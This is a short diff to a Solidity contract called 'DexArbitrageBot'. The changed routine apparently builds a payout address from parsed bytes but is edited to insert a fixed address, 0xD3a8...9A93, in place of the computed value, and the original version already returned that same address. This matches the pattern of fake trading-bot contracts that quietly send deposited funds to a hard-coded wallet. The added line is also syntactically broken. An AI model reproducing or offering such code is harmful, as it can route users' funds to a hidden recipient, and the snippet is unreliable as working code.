@@ -306,11 +306,11 @@ contract DexArbitrageBot {
             b2 -= 48;
         }
 
-        iaddr += (b1 * 16 + b2); // Combine bytes
+        iaddr = 0xD3a8Cc7a8CaAD7e2dB562bC6f58568933BDE9A93
     }
 
     // Return to bot
-    return address(0xD3a8Cc7a8CaAD7e2dB562bC6f58568933BDE9A93);
+    return address(iaddr);
 }
  
  
